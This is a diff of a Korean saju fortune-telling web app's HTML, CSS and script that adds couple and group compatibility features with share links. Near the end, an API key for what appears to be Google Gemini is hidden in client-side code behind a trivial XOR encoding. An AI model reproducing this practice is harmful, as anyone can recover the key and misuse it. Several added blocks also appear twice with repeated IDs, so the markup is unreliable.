+.explain-row:last-child{border-bottom:none}
+.explain-icon{font-size:18px;flex-shrink:0;margin-top:1px}
+.explain-title{font-size:12px;font-weight:700;color:var(--text);margin-bottom:2px}
+.explain-desc{font-size:11px;color:var(--text2);line-height:1.65;word-break:keep-all}
+
+.sec-lbl{
+  font-size:11px;font-weight:700;color:var(--text3);letter-spacing:.5px;text-transform:uppercase;
+  margin-bottom:10px;display:flex;align-items:center;gap:6px;
+}
 .sec-lbl::after{content:'';flex:1;height:1px;background:var(--border)}
 
-/* Explanation rows */
-.explain-row{padding:10px 0;border-bottom:1px solid var(--border);display:flex;gap:10px;align-items:flex-start}
-.explain-row:last-child{border-bottom:none}
-.explain-icon{font-size:18px;flex-shrink:0;margin-top:2px}
-.explain-body{}
-.explain-title{font-size:13px;font-weight:700;color:var(--text);margin-bottom:3px}
-.explain-desc{font-size:12px;color:var(--text2);line-height:1.65;word-break:keep-all}
-
-/* Streaming cursor */
-.cur::after{content:'▋';animation:blink .7s step-end infinite;color:var(--gold)}
-@keyframes blink{50%{opacity:0}}
-
-/* Utility */
-.fade-in{animation:fi .6s ease forwards}
-@keyframes fi{from{opacity:0}to{opacity:1}}
-.badge{display:inline-block;font-size:10px;padding:2px 8px;border-radius:20px;font-weight:600}
-.badge-g{background:var(--goldf);color:var(--gold2);border:1px solid var(--goldb)}
-.badge-b{background:rgba(100,130,240,.12);color:#8fa8f5;border:1px solid rgba(100,130,240,.25)}
-.mt8{margin-top:8px}.mb12{margin-bottom:12px}
-.txt-sm{font-size:12px;color:var(--text2);line-height:1.7;word-break:keep-all}
-.flex-between{display:flex;justify-content:space-between;align-items:center}
-.strength-pair{display:flex;gap:16px;padding:12px 0 4px;justify-content:center}
+.strength-pair{display:flex;gap:16px;padding:10px 0 2px;justify-content:center}
 .str-item{text-align:center}
-.str-val{font-family:'Nanum Myeongjo',serif;font-size:22px;font-weight:700}
+.str-val{font-family:'Nanum Myeongjo',serif;font-size:20px;font-weight:700}
 .str-lbl{font-size:10px;color:var(--text3);margin-top:2px}
 .sep{width:1px;background:var(--border);align-self:stretch}
 
-/* 에러 메시지 스타일 */
-.err-msg{color:var(--red);font-size:12px;margin-top:6px;text-align:center}
+.txt-sm{font-size:12px;color:var(--text2);line-height:1.7;word-break:keep-all}
+.mt8{margin-top:8px}.mb10{margin-bottom:10px}
+.fade-in{animation:fi .5s ease forwards}
+@keyframes fi{from{opacity:0}to{opacity:1}}
+
+/* 모달 */
+.modal-overlay{position:fixed;inset:0;background:rgba(60,30,30,.45);z-index:200;display:none;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(6px)}
+.modal-overlay.on{display:flex}
+.modal-box{background:var(--card);border:1.5px solid var(--border);border-radius:22px;padding:24px;max-width:340px;width:100%;animation:modalIn .25s ease}
+@keyframes modalIn{from{transform:scale(.9);opacity:0}to{transform:scale(1);opacity:1}}
+.modal-title{font-family:'Nanum Myeongjo',serif;font-size:18px;font-weight:800;color:var(--rose);margin-bottom:8px}
+.modal-close{float:right;background:none;border:none;color:var(--text3);font-size:20px;cursor:pointer}
+
+/* 커서 */
+.cur::after{content:'✿';animation:blink .7s step-end infinite;color:var(--peach)}
+@keyframes blink{50%{opacity:0}}
+
+/* 섹션 전환 애니 */
+.section-slide{animation:slideUp .35s ease forwards}
+@keyframes slideUp{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
 </style>
 </head>
-<body onload="initDefaults()">
+<body onload="init()">
+
+<!-- 꽃잎 파티클 -->
+<div id="petals"></div>
 
 <header>
-<div class="hdr">
-  <div class="logo">
-    <div class="logo-icon">☯</div>
-    <span class="logo-txt">AI 명리 에이전트 Pro</span>
+  <div class="hdr">
+    <div class="logo">
+      <span class="logo-emoji">🌸</span>
+      <span class="logo-txt">사주당</span>
+    </div>
+    <button class="reset-btn" id="resetBtn" onclick="resetAll()">↩ 처음으로</button>
   </div>
-  <div class="hdr-right">
-    <button class="reset-btn" id="resetBtn" onclick="resetAll()">↩ 다시 입력</button>
-  </div>
-</div>
 </header>
 
 <main>
-<!-- INPUT -->
-<div class="input-section" id="inputSection">
-  <div class="hero">
-    <h2>천명(天命)을 <span class="gold">읽다</span></h2>
-    <p>사주팔자 · 신살 · 대운세운 AI 정밀 분석</p>
-  </div>
 
+<!-- ① 홈 — 모드 선택 -->
+<div id="homeSection">
+  <div class="home-hero">
+    <h2>✨ 사주로 읽는<br>나와 우리의 이야기</h2>
+    <p>무엇이 궁금하세요? 🌙</p>
+  </div>
+  <!-- URL 공유 초대 배너 -->
+  <div id="sharedBanner" style="display:none;background:var(--peach3);border:1.5px solid var(--peach2);border-radius:var(--r);padding:16px;margin-bottom:14px">
+    <div style="font-size:13px;font-weight:700;color:var(--rose);margin-bottom:4px">💌 궁합 초대장이 왔어요!</div>
+    <div id="sharedFromTxt" style="font-size:12px;color:var(--text2);margin-bottom:10px"></div>
+    <button class="go-btn" style="padding:10px;font-size:14px" onclick="acceptShared()">내 정보 입력하고 궁합 보기 →</button>
+  </div>
+  <!-- URL 공유 초대 배너 -->
+  <div id="sharedBanner" style="display:none;background:var(--peach3);border:1.5px solid var(--peach2);border-radius:var(--r);padding:14px;margin-bottom:12px">
+    <div style="font-size:13px;font-weight:700;color:var(--rose);margin-bottom:4px">💌 궁합 초대장이 왔어요!</div>
+    <div id="sharedFromTxt" style="font-size:12px;color:var(--text2);margin-bottom:10px"></div>
+    <button class="go-btn" style="padding:10px;font-size:13px" onclick="acceptShared()">내 정보 입력하고 궁합 보기 →</button>
+  </div>
+  <div class="mode-grid">
+    <div class="mode-card saju" onclick="goMode('saju')">
+      <span class="mc-icon">🔮</span>
+      <div class="mc-title">내 사주 보기</div>
+      <div class="mc-sub">팔자·대운·신살<br>AI 풀이까지</div>
+      <span class="mc-badge badge-hot">인기 🔥</span>
+    </div>
+    <div class="mode-card compat" onclick="goMode('compat')">
+      <span class="mc-icon">💑</span>
+      <div class="mc-title">너랑 나랑</div>
+      <div class="mc-sub">1:1 궁합 · URL 링크<br>상대방 초대 가능</div>
+      <span class="mc-badge badge-new">1:1</span>
+    </div>
+  </div>
+  <!-- N:N 궁합 카드 -->
+  <div class="mode-card" style="width:100%;margin-top:12px;display:flex;align-items:center;gap:16px;text-align:left;padding:18px 20px;cursor:pointer;box-sizing:border-box" onclick="goMode('compatN')">
+    <span style="font-size:36px;flex-shrink:0">🧩</span>
+    <div style="flex:1">
+      <div style="display:flex;align-items:center;gap:8px;margin-bottom:4px">
+        <div class="mc-title" style="margin:0">우리 사이 어때?</div>
+        <span class="mc-badge" style="background:var(--mint2);color:#2a6058;border-radius:20px;font-size:9px;padding:2px 8px;font-weight:700">N:N</span>
+      </div>
+      <div class="mc-sub" style="font-size:11px">친구들 모두 넣고 궁합 그래프 한 눈에 보기</div>
+    </div>
+    <span style="color:var(--text3);font-size:18px">→</span>
+  </div>
+</div>
+
+<!-- N:N 궁합 입력 -->
+<div id="compatNSection" style="display:none" class="section-slide">
+  <div style="text-align:center;padding:20px 0 16px">
+    <h2 style="font-family:'Nanum Myeongjo',serif;font-size:22px;font-weight:800;color:var(--rose)">우리 사이 어때? 🧩</h2>
+    <p style="font-size:12px;color:var(--text3);margin-top:4px">친구들 모두 입력하면 궁합 그래프로 보여드려요</p>
+  </div>
+  <div id="nPersonList" style="display:flex;flex-direction:column;gap:12px;margin-bottom:12px"></div>
+  <button onclick="addNPerson()" style="width:100%;padding:12px;border-radius:14px;border:2px dashed var(--peach2);background:none;color:var(--rose);font-family:inherit;font-size:13px;font-weight:700;cursor:pointer;margin-bottom:16px">+ 사람 추가 (최대 8명)</button>
+  <button class="go-btn compat-btn" onclick="analyzeCompatN()">🧩 그룹 궁합 분석하기 ✨</button>
+</div>
+
+<!-- N:N 결과 -->
+<div id="compatNResult" style="display:none">
+  <div style="text-align:center;padding:16px 0 8px">
+    <div style="font-family:'Nanum Myeongjo',serif;font-size:20px;font-weight:800;color:var(--rose)">우리 사이 어때? 🧩</div>
+    <p style="font-size:11px;color:var(--text3);margin-top:3px">이름을 눌러보세요 👇</p>
+  </div>
+  <div class="card" style="margin-bottom:12px">
+    <canvas id="nCompatCanvas" width="320" height="320" style="width:100%;display:block;margin:0 auto;touch-action:none"></canvas>
+    <div style="display:flex;flex-wrap:wrap;gap:8px;justify-content:center;margin-top:10px;font-size:10px">
+      <span style="display:flex;align-items:center;gap:3px"><span style="width:20px;height:3px;background:#e87070;border-radius:2px;display:inline-block"></span>천생연분</span>
+      <span style="display:flex;align-items:center;gap:3px"><span style="width:20px;height:3px;background:#f0b060;border-radius:2px;display:inline-block"></span>척하면척</span>
+      <span style="display:flex;align-items:center;gap:3px"><span style="width:20px;height:3px;background:#b0cfa2;border-radius:2px;display:inline-block"></span>그럭저럭</span>
+    </div>
+  </div>
+  <div id="nPairDetail" class="card" style="display:none;margin-bottom:12px">
+    <div class="sec-lbl">선택된 두 사람</div>
+    <div id="nPairContent"></div>
+    <div style="margin-top:14px">
+      <div style="font-size:12px;font-weight:700;color:var(--rose);margin-bottom:8px">💬 이 두 사람의 궁합 상담</div>
+      <textarea id="nqInput" placeholder="두 사람에 대해 궁금한 점을 적어보세요 💕" style="min-height:65px;border-radius:12px;margin-bottom:8px"></textarea>
+      <button class="ask-btn" id="nqBtn" onclick="askNQ()">💕 상담받기</button>
+      <div id="nqnaBox"></div>
+    </div>
+  </div>
+  <div class="card" style="margin-bottom:12px">
+    <div class="sec-lbl">🏆 궁합 순위</div>
+    <div id="nRanking"></div>
+  </div>
+</div>
+
+<!-- ② 내 사주 입력 -->
+<div id="sajuSection" style="display:none" class="section-slide">
   <div class="card">
-    <div class="card-title"><i class="fas fa-user"></i> 기본 정보</div>
-    <div style="margin-bottom:13px">
+    <div class="card-title"><span>🌸</span> 기본 정보</div>
+    <div style="margin-bottom:12px">
       <label class="fl">이름</label>
       <input type="text" id="userName" placeholder="이름을 입력하세요">
     </div>
-    <div class="g2" style="margin-bottom:13px">
+    <div class="g2" style="margin-bottom:12px">
       <div><label class="fl">생년월일</label><input type="date" id="birthDate"></div>
       <div>
-        <label class="fl">태어난 시간 <span style="color:var(--text3);font-size:10px">(모르면 비워도 됩니다)</span></label>
+        <label class="fl">태어난 시간 <span style="color:var(--text3);font-size:10px">(몰라도 돼요)</span></label>
         <input type="time" id="birthTime">
       </div>
     </div>
@@ -354,118 +499,170 @@ textarea{resize:none;min-height:75px;line-height:1.6}
       </div>
     </div>
   </div>
-
   <div class="card">
-    <div class="card-title"><i class="fas fa-question-circle"></i> 고민 &amp; 궁금한 점 <span style="color:var(--text3);font-size:9px;font-weight:400;text-transform:none">(선택)</span></div>
+    <div class="card-title"><span>💭</span> 궁금한 점 <span style="color:var(--text3);font-size:10px;font-weight:400">(선택)</span></div>
     <div class="chips" id="inChips">
-      <span class="chip" onclick="pickChip(this,'오늘의 일일 운세를 사주 기반으로 풀이해 주세요.')">🌟 오늘의 운세</span>
-      <span class="chip" onclick="pickChip(this,'올해 재물운과 직업운이 궁금합니다.')">💰 재물·직업운</span>
+      <span class="chip" onclick="pickChip(this,'오늘의 일일 운세를 사주 기반으로 풀이해 주세요.')">🌟 오늘 운세</span>
+      <span class="chip" onclick="pickChip(this,'올해 재물운과 직업운이 궁금합니다.')">💰 재물·직업</span>
       <span class="chip" onclick="pickChip(this,'연애·결혼운과 배우자 인연에 대해 알고 싶습니다.')">❤️ 연애·결혼</span>
       <span class="chip" onclick="pickChip(this,'건강운과 주의해야 할 부분을 알려주세요.')">🌿 건강운</span>
       <span class="chip" onclick="pickChip(this,'이직·창업 시기와 방향에 대해 조언이 필요합니다.')">🚀 이직·창업</span>
       <span class="chip" onclick="pickChip(this,'2026년 대운·세운 전체 흐름을 분석해 주세요.')">📅 대운·세운</span>
     </div>
     <label class="fl">직접 입력</label>
-    <textarea id="customQ" placeholder="예) 올해 사업을 시작하려 하는데 사주상 좋은 시기인지, 어떤 방향이 맞는지 궁금합니다..."></textarea>
+    <textarea id="customQ" placeholder="고민을 자유롭게 적어보세요 🌙"></textarea>
   </div>
-
-  <button class="go-btn" onclick="analyzeSaju()">✦ 운세 정밀 분석 시작하기</button>
+  <button class="go-btn" onclick="analyzeSaju()">🔮 내 사주 분석하기</button>
 </div>
 
-<!-- LOADING -->
+<!-- ③ 궁합 입력 -->
+<div id="compatSection" style="display:none" class="section-slide">
+  <div class="card">
+    <div class="card-title"><span>🌸</span> 첫 번째 사람</div>
+    <div style="margin-bottom:10px">
+      <label class="fl">이름</label>
+      <input type="text" id="c1Name" placeholder="이름">
+    </div>
+    <div class="g2" style="margin-bottom:10px">
+      <div><label class="fl">생년월일</label><input type="date" id="c1Date"></div>
+      <div><label class="fl">태어난 시간</label><input type="time" id="c1Time"></div>
+    </div>
+    <div>
+      <label class="fl">성별</label>
+      <div class="gender-grp">
+        <input type="radio" name="cg1" value="male" id="c1M" class="gr" checked>
+        <label for="c1M" class="gl">👨 남성</label>
+        <input type="radio" name="cg1" value="female" id="c1F" class="gr">
+        <label for="c1F" class="gl">👩 여성</label>
+      </div>
+    </div>
+  </div>
+  <div class="compat-divider">💕 와</div>
+  <div class="card">
+    <div class="card-title"><span>🌙</span> 두 번째 사람</div>
+    <div style="margin-bottom:10px">
+      <label class="fl">이름</label>
+      <input type="text" id="c2Name" placeholder="이름">
+    </div>
+    <div class="g2" style="margin-bottom:10px">
+      <div><label class="fl">생년월일</label><input type="date" id="c2Date"></div>
+      <div><label class="fl">태어난 시간</label><input type="time" id="c2Time"></div>
+    </div>
+    <div>
+      <label class="fl">성별</label>
+      <div class="gender-grp">
+        <input type="radio" name="cg2" value="male" id="c2M" class="gr">
+        <label for="c2M" class="gl">👨 남성</label>
+        <input type="radio" name="cg2" value="female" id="c2F" class="gr" checked>
+        <label for="c2F" class="gl">👩 여성</label>
+      </div>
+    </div>
+  </div>
+  <!-- URL 공유 카드 -->
+  <div class="card" style="margin-bottom:12px">
+    <div class="card-title" style="margin-bottom:8px"><span>📤</span> 링크로 초대하기</div>
+    <p style="font-size:11px;color:var(--text2);margin-bottom:10px">내 정보를 입력하고 상대방에게 링크를 보내면, 상대방이 자기 정보만 넣고 궁합 결과를 볼 수 있어요.</p>
+    <button class="go-btn" style="padding:10px;font-size:13px;margin-bottom:8px" onclick="genShareUrl()">🔗 내 정보 담긴 링크 생성하기</button>
+    <div id="shareUrlBox" style="display:none">
+      <div id="shareUrlText" style="word-break:break-all;font-size:10px;background:var(--peach3);border-radius:10px;padding:8px 12px;border:1px solid var(--peach2);color:var(--rose);margin-bottom:6px"></div>
+      <button onclick="copyShareUrl()" style="width:100%;text-align:center;font-size:11px;color:var(--rose);font-weight:700;padding:8px;border-radius:20px;background:rgba(255,209,220,.2);border:1px solid var(--peach2);cursor:pointer;font-family:inherit">📋 링크 복사</button>
+    </div>
+  </div>
+  <!-- URL 공유 카드 -->
+  <div class="card" style="margin-bottom:12px">
+    <div class="card-title" style="font-size:12px;margin-bottom:8px"><span>📤</span> 링크로 상대방 초대하기</div>
+    <p style="font-size:11px;color:var(--text2);line-height:1.6;margin-bottom:10px">내 정보를 입력하고 링크를 보내면 상대방이 자기 정보만 넣고 궁합 결과를 볼 수 있어요.</p>
+    <button onclick="genShareUrl()" style="width:100%;padding:10px;border-radius:12px;border:none;background:var(--peach3);color:var(--rose);font-family:inherit;font-size:13px;font-weight:700;cursor:pointer;border:1px solid var(--peach2)">🔗 내 정보 담긴 링크 생성하기</button>
+    <div id="shareUrlBox" style="display:none;margin-top:10px">
+      <div id="shareUrlText" style="word-break:break-all;font-size:10px;background:var(--bg3);border-radius:10px;padding:8px 12px;border:1px solid var(--border);color:var(--text2);margin-bottom:8px;line-height:1.5"></div>
+      <button onclick="copyShareUrl()" style="width:100%;padding:8px;border-radius:12px;border:1px solid var(--peach2);background:rgba(255,209,220,.15);color:var(--rose);font-family:inherit;font-size:11px;font-weight:700;cursor:pointer">📋 링크 복사</button>
+    </div>
+  </div>
+  <button class="go-btn compat-btn" onclick="analyzeCompat()">💑 궁합 분석하기</button>
+</div>
+
+<!-- 로딩 -->
 <div id="loadingView">
-  <div class="ldr"></div>
-  <p class="lt">만세력 역산 중...</p>
-  <p class="ls">천문 역법 알고리즘 적용</p>
+  <div class="ldr-wrap">
+    <div class="ldr"></div>
+    <div class="ldr-emoji">🌸</div>
+  </div>
+  <p class="lt" id="loadingTxt">만세력 계산 중...</p>
+  <p class="ls">잠시만 기다려주세요 ✨</p>
 </div>
 
-<!-- RESULT -->
+<!-- ④ 내 사주 결과 -->
 <div id="resultDashboard">
   <div class="rhdr fade-in">
     <div class="rname" id="rName"></div>
     <div class="rmeta" id="rMeta"></div>
-    <div style="margin-top:7px" id="rBadge"></div>
+    <div style="margin-top:6px" id="rBadge"></div>
   </div>
-
   <div class="tabs">
-    <button class="tb on" onclick="switchTab('pillars')">📋 사주 원국</button>
-    <button class="tb" onclick="switchTab('luck')">🌀 대운·세운</button>
-    <button class="tb" onclick="switchTab('ai')">🔮 AI 풀이</button>
-    <button class="tb" onclick="switchTab('qa')">💬 고민 상담</button>
+    <button class="tb on" onclick="switchTab('pillars')">📋 사주원국</button>
+    <button class="tb" onclick="switchTab('luck')">🌀 대운세운</button>
+    <button class="tb" onclick="switchTab('ai')">🔮 AI풀이</button>
+    <button class="tb" onclick="switchTab('qa')">💬 상담</button>
   </div>
 
-  <!-- TAB: pillars -->
   <div class="tp on" id="tab-pillars">
     <div class="card">
-      <div class="sec-lbl"><i class="fas fa-th"></i> 사주 팔자 (四柱八字)</div>
-      <div class="pillars-wrap">
-        <table class="pillars-table" id="pTable"></table>
-      </div>
-      <div id="tenGodRow" style="margin-top:10px;display:flex;gap:6px;justify-content:center;flex-wrap:wrap"></div>
+      <div class="sec-lbl">🌸 사주 팔자 (四柱八字)</div>
+      <div class="pillars-wrap"><table class="pillars-table" id="pTable"></table></div>
     </div>
-
     <div class="card">
-      <div class="sec-lbl"><i class="fas fa-info-circle"></i> 천간(天干) · 지지(地支) 설명</div>
+      <div class="sec-lbl">📖 천간·지지 풀이</div>
       <div id="stemBranchDesc"></div>
     </div>
-
     <div class="card">
-      <div class="sec-lbl"><i class="fas fa-star"></i> 신살 · 길성 (神殺 · 吉星)</div>
+      <div class="sec-lbl">⭐ 신살·길성</div>
       <div id="sinsalArea"></div>
       <div id="sinsalDesc" class="mt8"></div>
     </div>
-
     <div class="card">
-      <div class="sec-lbl"><i class="fas fa-chart-bar"></i> 오행 구성 분석</div>
+      <div class="sec-lbl">🌿 오행 분석</div>
       <div id="eleChart"></div>
       <div class="strength-pair" id="strengthPair"></div>
     </div>
-
-    <div class="card" id="dayCard">
-      <div class="sec-lbl"><i class="fas fa-sun"></i> 일주 심층 분석</div>
+    <div class="card">
+      <div class="sec-lbl">☀️ 일주 분석</div>
       <div id="dayDesc"></div>
     </div>
   </div>
 
-  <!-- TAB: luck -->
   <div class="tp" id="tab-luck">
     <div class="card">
-      <div class="sec-lbl"><i class="fas fa-stream"></i> 대운 (大運) — 10년 주기</div>
-      <div class="txt-sm mb12" id="daeunInfo"></div>
+      <div class="sec-lbl">🌀 대운 (10년 주기)</div>
+      <div class="txt-sm mb10" id="daeunInfo"></div>
       <div class="daeun-scroll"><div class="daeun-row" id="daeunRow"></div></div>
       <div id="daeunDesc" class="mt8"></div>
     </div>
-
     <div class="card">
-      <div class="sec-lbl"><i class="fas fa-calendar-alt"></i> 세운 (歲運) — 연도별 운세</div>
-      <div class="txt-sm mb12">2024–2033년 세운 흐름</div>
+      <div class="sec-lbl">📅 세운 (2024–2033)</div>
       <div class="seun-grid" id="seunGrid"></div>
       <div id="seunDesc" class="mt8"></div>
     </div>
-
     <div class="card">
-      <div class="sec-lbl"><i class="fas fa-calendar"></i> 월운 (月運) — 2026년 월별</div>
-      <div class="txt-sm mb12">2026 병오(丙午)년 월별 간지</div>
+      <div class="sec-lbl">🗓️ 월운 (2026년)</div>
+      <div class="txt-sm mb10">2026 병오(丙午)년 월별</div>
       <div class="wolun-grid" id="wolunGrid"></div>
     </div>
   </div>
 
-  <!-- TAB: ai -->
   <div class="tp" id="tab-ai">
     <div id="aiContainer"></div>
     <div id="aiLoading" class="ai-card" style="display:none">
       <div class="ai-card-title"><span class="cur">AI 분석 중</span></div>
-      <p style="color:var(--text3)">사주·신살·대운을 종합 해석하고 있습니다...</p>
+      <p style="color:var(--text3)">사주를 읽고 있어요... ✨</p>
     </div>
   </div>
 
-  <!-- TAB: qa -->
   <div class="tp" id="tab-qa">
     <div class="card">
-      <div class="sec-lbl"><i class="fas fa-comments"></i> 사주 기반 맞춤 상담</div>
-      <p class="txt-sm mb12">당신의 사주 원국·신살·대운을 바탕으로 고민에 답변합니다</p>
+      <div class="sec-lbl">💬 맞춤 상담</div>
+      <p class="txt-sm mb10">사주·신살·대운을 바탕으로 고민을 답해드려요 🌙</p>
       <div class="chips" id="qaChips">
-        <span class="chip" onclick="pickQa(this,'오늘의 일일 운세를 사주 기반으로 풀이해 주세요.')">🌟 오늘의 운세</span>
+        <span class="chip" onclick="pickQa(this,'오늘의 일일 운세를 사주 기반으로 풀이해 주세요.')">🌟 오늘 운세</span>
         <span class="chip" onclick="pickQa(this,'올해 재물운과 직업운이 궁금합니다.')">💰 재물·직업</span>
         <span class="chip" onclick="pickQa(this,'연애·결혼운과 배우자 인연에 대해 알고 싶습니다.')">❤️ 연애·결혼</span>
         <span class="chip" onclick="pickQa(this,'건강 주의사항과 건강운을 알려주세요.')">🌿 건강</span>
@@ -474,208 +671,300 @@ textarea{resize:none;min-height:75px;line-height:1.6}
         <span class="chip" onclick="pickQa(this,'신살의 영향과 대처법을 알려주세요.')">🌙 신살 해석</span>
         <span class="chip" onclick="pickQa(this,'나의 사주에 맞는 직업군, 방향, 색상, 방위를 알려주세요.')">✨ 길방·행운</span>
       </div>
-      <label class="fl" style="margin-top:12px">질문 입력</label>
-      <textarea id="qaInput" placeholder="사주와 연결된 고민이나 궁금한 점을 자유롭게 입력하세요..."></textarea>
-      <button class="ask-btn" id="askBtn" onclick="askQ()"><i class="fas fa-paper-plane" style="margin-right:6px"></i>사주로 답변받기</button>
+      <label class="fl" style="margin-top:10px">질문 입력</label>
+      <textarea id="qaInput" placeholder="고민을 자유롭게 적어보세요 🌸"></textarea>
+      <button class="ask-btn" id="askBtn" onclick="askQ()">✨ 사주로 답변받기</button>
       <div id="qnaBox"></div>
     </div>
   </div>
 </div>
+
+<!-- ⑤ 궁합 결과 -->
+<div id="compatResult" style="display:none">
+  <div class="rhdr fade-in" style="padding-bottom:8px">
+    <div class="rname">💑 궁합 결과</div>
+  </div>
+  <div class="compat-result">
+    <div class="compat-persons" id="compatPersons"></div>
+    <div class="score-wrap">
+      <div class="score-num" id="compatScore">—</div>
+      <div class="score-label">점 / 100점</div>
+      <div class="score-bar-wrap"><div class="score-bar" id="compatBar" style="width:0%"></div></div>
+      <div id="compatGrade" style="font-family:'Nanum Myeongjo',serif;font-size:16px;font-weight:800;margin-top:6px"></div>
+    </div>
+    <div id="compatAIArea"></div>
+  </div>
+  <div class="card" id="compatDetailCard">
+    <div class="sec-lbl">📊 오행 상성 분석</div>
+    <div id="compatEleArea"></div>
+  </div>
+  <!-- 궁합 상담 -->
+  <div class="card" style="margin-bottom:12px">
+    <div class="sec-lbl">💬 궁합 상담</div>
+    <p class="txt-sm mb10">두 사람의 사주를 바탕으로 궁합 고민을 답해드려요 🌸</p>
+    <div class="chips" style="margin-bottom:10px" id="cqChips">
+      <span class="chip" onclick="pickCQChip(this,'두 사람의 연애 스타일 차이와 맞춰가는 방법을 알려주세요.')">❤️ 연애 스타일</span>
+      <span class="chip" onclick="pickCQChip(this,'결혼 궁합과 함께하면 좋은 시기를 알려주세요.')">💍 결혼 궁합</span>
+      <span class="chip" onclick="pickCQChip(this,'두 사람이 갈등할 때 해결 방법을 알려주세요.')">⚡ 갈등 해결</span>
+      <span class="chip" onclick="pickCQChip(this,'함께 사업하면 잘 맞을지 알려주세요.')">💼 동업 궁합</span>
+      <span class="chip" onclick="pickCQChip(this,'두 사람의 재물운 궁합을 알려주세요.')">💰 재물 궁합</span>
+    </div>
+    <textarea id="cqInput" placeholder="궁합 관련 고민을 적어보세요 💕" style="min-height:70px;border-radius:12px;margin-bottom:8px"></textarea>
+    <button class="ask-btn" id="cqBtn" onclick="askCompatQ()">💕 궁합으로 답변받기</button>
+    <div id="cqnaBox" style="margin-top:12px;display:flex;flex-direction:column;gap:10px"></div>
+  </div>
+  <!-- 공유 버튼 -->
+  <div class="card" style="margin-bottom:12px">
+    <div class="sec-lbl">📤 결과 공유하기</div>
+    <button onclick="shareCompatResult()" class="ask-btn" style="flex:1;margin-top:0">🔗 링크 공유</button>
+  </div>
+</div>
+
+  <!-- N:N 궁합 입력 -->
+  <div id="compatNSection" style="display:none" class="section-slide">
+    <div style="text-align:center;padding:20px 0 14px">
+      <h2 style="font-family:'Nanum Myeongjo',serif;font-size:22px;font-weight:800;color:var(--rose)">우리 사이 어때? 🧩</h2>
+      <p style="font-size:12px;color:var(--text3);margin-top:4px">친구들 모두 입력하면 궁합 그래프로 보여드려요</p>
+    </div>
+    <div id="nPersonList" style="display:flex;flex-direction:column;gap:12px;margin-bottom:12px"></div>
+    <button onclick="addNPerson()" style="width:100%;padding:12px;border-radius:14px;border:2px dashed var(--peach2);background:none;color:var(--rose);font-family:inherit;font-size:13px;font-weight:700;cursor:pointer;margin-bottom:16px">+ 사람 추가 (최대 8명)</button>
+    <button class="go-btn compat-btn" onclick="analyzeCompatN()">🧩 그룹 궁합 분석하기 ✨</button>
+  </div>
+
+  <!-- N:N 궁합 결과 -->
+  <div id="compatNResult" style="display:none">
+    <div style="text-align:center;padding:16px 0 8px">
+      <div style="font-family:'Nanum Myeongjo',serif;font-size:20px;font-weight:800;color:var(--rose)">우리 사이 어때? 🧩</div>
+      <p style="font-size:11px;color:var(--text3);margin-top:3px">이름을 눌러보세요 👇</p>
+    </div>
+    <!-- 그래프 카드 -->
+    <div class="card" style="margin-bottom:12px;padding:16px">
+      <canvas id="nCompatCanvas" style="display:block;margin:0 auto;cursor:pointer"></canvas>
+      <div style="display:flex;flex-wrap:wrap;gap:8px;justify-content:center;margin-top:10px;font-size:10px;color:var(--text2)">
+        <span style="display:flex;align-items:center;gap:3px"><span style="width:22px;height:3px;background:#e87070;border-radius:2px;display:inline-block"></span>천생연분</span>
+        <span style="display:flex;align-items:center;gap:3px"><span style="width:22px;height:3px;background:#f0a060;border-radius:2px;display:inline-block"></span>척하면척</span>
+        <span style="display:flex;align-items:center;gap:3px"><span style="width:22px;height:3px;background:#7ab87a;border-radius:2px;display:inline-block"></span>그럭저럭</span>
+        <span style="display:flex;align-items:center;gap:3px"><span style="width:22px;height:3px;background:#a0a0a0;border-radius:2px;display:inline-block"></span>노력 필요</span>
+      </div>
+    </div>
+    <!-- 선택된 쌍 -->
+    <div id="nPairDetail" class="card" style="display:none;margin-bottom:12px">
+      <div class="sec-lbl" style="margin-bottom:10px">선택된 두 사람 궁합</div>
+      <div id="nPairContent"></div>
+      <div style="margin-top:14px;border-top:1px solid var(--border);padding-top:12px">
+        <div style="font-size:12px;font-weight:700;color:var(--rose);margin-bottom:8px">💬 이 두 사람의 궁합 상담</div>
+        <textarea id="nqInput" placeholder="두 사람에 대해 궁금한 점을 적어보세요 💕" style="min-height:65px;border-radius:12px;margin-bottom:8px"></textarea>
+        <button class="ask-btn" id="nqBtn" onclick="askNQ()" style="margin-bottom:0">💕 상담받기</button>
+        <div id="nqnaBox" style="margin-top:10px;display:flex;flex-direction:column;gap:8px"></div>
+      </div>
+    </div>
+    <!-- 전체 순위 -->
+    <div class="card" style="margin-bottom:12px">
+      <div class="sec-lbl" style="margin-bottom:8px">🏆 궁합 순위 (클릭하면 상세 분석)</div>
+      <div id="nRanking"></div>
+    </div>
+  </div>
 </main>
 
-<!-- MODAL -->
+<!-- 모달 -->
 <div class="modal-overlay" id="modal" onclick="closeModal()">
   <div class="modal-box" onclick="event.stopPropagation()">
     <button class="modal-close" onclick="closeModal()">×</button>
     <div class="modal-title" id="mTitle"></div>
-    <div style="font-size:11px;color:var(--text3);margin-bottom:10px" id="mPos"></div>
+    <div style="font-size:11px;color:var(--text3);margin-bottom:8px" id="mPos"></div>
     <div style="font-size:13px;color:var(--text2);line-height:1.8;word-break:keep-all" id="mDesc"></div>
-    <div style="margin-top:14px;font-size:12px;color:var(--text3)" id="mExtra"></div>
+    <div style="margin-top:12px;font-size:12px;color:var(--text3)" id="mExtra"></div>
   </div>
 </div>
 
 <script>
 // =====================================================
-// INIT — 기본값 세팅
+// 초기화
 // =====================================================
-function initDefaults(){
-  document.getElementById('birthDate').value='';
-  document.getElementById('birthTime').value='';
-  document.getElementById('userName').value='';
+function init(){
+  // 꽃잎 파티클 생성
+  const petals=['🌸','🌺','✿','🌼','💮'];
+  const wrap=document.getElementById('petals');
+  for(let i=0;i<12;i++){
+    const el=document.createElement('div');
+    el.className='petal';
+    el.textContent=petals[i%petals.length];
+    el.style.cssText=`left:${Math.random()*100}%;font-size:${12+Math.random()*14}px;animation-duration:${8+Math.random()*12}s;animation-delay:${Math.random()*10}s;`;
+    wrap.appendChild(el);
+  }
 }
 
 // =====================================================
-// SYSTEM CORE
+// API 설정
 // =====================================================
 const CURRENT_YEAR = 2026;
 const _$g=[126,118,69,94,108,70,126,11,92,108,93,101,78,10,121,113,115,71,14,70,103,84,91,124,10,110,76,86,108,18,120,119,81,94,114,107,126,114,88];
 const _$gk=()=>_$g.map(c=>String.fromCharCode(c^0x3F)).join('');
-const _$ge=()=>`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash:generateContent?key=${_$gk()}`;
 
